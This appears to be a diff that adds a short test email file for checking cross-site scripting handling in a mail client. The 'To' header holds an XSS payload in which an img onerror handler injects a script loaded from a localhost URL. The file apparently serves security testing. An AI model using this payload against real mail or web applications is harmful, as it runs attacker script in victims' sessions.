@@ -1,0 +1,7 @@
+From: "Carissa Olsen" <mvcaution@compgraf.com>
+To: <"victim<img src=x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e)>@victim.com">
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
